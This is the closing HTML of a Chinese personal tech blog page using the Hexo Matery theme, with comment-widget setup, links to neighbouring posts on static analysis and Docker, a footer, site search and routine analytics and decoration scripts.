    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }
</style>

<div class="card valine-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>评论</span>
    </div>
    <div id="vcomments" class="card-content" style="display: grid">
    </div>
</div>

<script src="/libs/valine/av-min.js"></script>
<script src="/libs/valine/Valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        appId: 'U2qj9LBn7UhJFyVyb1bYDa9w-gzGzoHsz',
        appKey: 'Tg6wRvRlIfODtULeHu4P96zh',
        notify: 'true' === 'true',
        verify: 'false' === 'true',
        visitor: 'false' === 'true',
        avatar: 'mm',
        pageSize: '10',
        lang: 'en',
        placeholder: 'just go go'
    });
</script>

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
            <div class="card">
                <a href="/2023/12/09/lab-static-analysis/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="Lab-Static-Analysis">
                        
                        <span class="card-title">Lab-Static-Analysis</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            Java|静态分析
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2023-12-09
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/Lab/" class="post-category">
                                    Lab
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/Java/">
                        <span class="chip bg-color">Java</span>
                    </a>
                    
                    <a href="/tags/Static-Analysis/">
                        <span class="chip bg-color">Static-Analysis</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                Next&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2023/12/09/docker/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="Docker">
                        
                        <span class="card-title">Docker</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            image、容器、环境配置
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2023-12-09
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/Tools/" class="post-category">
                                    Tools
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/Docker/">
                        <span class="chip bg-color">Docker</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h3, h4, h5'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h3, h4, h5').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




                            <footer class="page-footer bg-color">
    
    <div class="container row center-align" style="margin-bottom: 15px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2023</span>
            
            <span id="year">2023</span>
            <a href="/about" target="_blank">Jf71o0x1o1l</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                class="white-color">235.5k</span>&nbsp;字
            
            
            
            
            
            
            <span id="busuanzi_container_site_pv">
                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;次
            </span>
            
            
            <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;人
            </span>
            
            <br>
            
            <span id="sitetime">载入运行时间...</span>
            <script>
                function siteTime() {
                    var seconds = 1000;
                    var minutes = seconds * 60;
                    var hours = minutes * 60;
                    var days = hours * 24;
                    var years = days * 365;
                    var today = new Date();
                    var startYear = "2023";
                    var startMonth = "2";
                    var startDate = "16";
                    var startHour = "24";
                    var startMinute = "0";
                    var startSecond = "0";
                    var todayYear = today.getFullYear();
                    var todayMonth = today.getMonth() + 1;
                    var todayDate = today.getDate();
                    var todayHour = today.getHours();
                    var todayMinute = today.getMinutes();
                    var todaySecond = today.getSeconds();
                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
                    var diff = t2 - t1;
                    var diffYears = Math.floor(diff / years);
                    var diffDays = Math.floor((diff / days) - diffYears * 365);
                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
                        minutes);
                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
                        diffMinutes * minutes) / seconds);
                    if (startYear == todayYear) {
                        document.getElementById("year").innerHTML = todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    } else {
                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    }
                }
                setInterval(siteTime, 1000);
            </script>
            
            <br>
            
            <span id="icp"><img src="/medias/icp.png" style="vertical-align: text-bottom;" />
                <a href="/null" target="_blank">津ICP备Jf710001011号</a>
            </span>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/Jf710001011" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:lhhyp2333@gmail.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>













    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


                                <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;Search</span>
            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

                                    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


                                        <script
                                            src="/libs/materialize/materialize.min.js"></script>
                                        <script
                                            src="/libs/masonry/masonry.pkgd.min.js"></script>
                                        <script
                                            src="/libs/aos/aos.js"></script>
                                        <script
                                            src="/libs/scrollprogress/scrollProgress.min.js"></script>
                                        <script
                                            src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
                                        <script
                                            src="/js/matery.js"></script>

                                        <!-- Baidu Analytics -->

<script>
    var _hmt = _hmt || [];
    (function () {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
    })();
</script>

                                            <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

                                                
                                                    <script
                                                        src="/libs/others/clicklove.js"
                                                        async="async"></script>
                                                    
                                                        
                                                            <script async
                                                                src="/libs/others/busuanzi.pure.mini.js"></script>
                                                            

                                                                

                                                                        

                                                                                
                                                                                        
                                                                                            <script
                                                                                                type="text/javascript"
                                                                                                color="0,0,255"
                                                                                                pointColor="0,0,255"
                                                                                                opacity='0.7'
                                                                                                zIndex="-1"
                                                                                                count="99"
                                                                                                src="/libs/background/canvas-nest.js"></script>
                                                                                            

                                                                                                

                                                                                                            
                                                                                                                <script
                                                                                                                    type="text/javascript"
                                                                                                                    src="/libs/background/ribbon-dynamic.js"
                                                                                                                    async="async"></script>
                                                                                                                

                                                                                                                    
                                                                                                                        <script
                                                                                                                            src="/libs/instantpage/instantpage.js"
                                                                                                                            type="module"></script>
                                                                                                                        
                                                                                                                            <script
                                                                                                                                type="text/javascript">
                                                                                                                                    //只在桌面版网页启用特效
                                                                                                                                    var windowWidth = $(window).width();
                                                                                                                                    if (windowWidth > 768) {
                                                                                                                                        document.write('<script type="text/javascript" src="/js/sakura.js"><\/script>');
                                                                                                                                    }
                                                                                                                                </script>
                </body>

</html>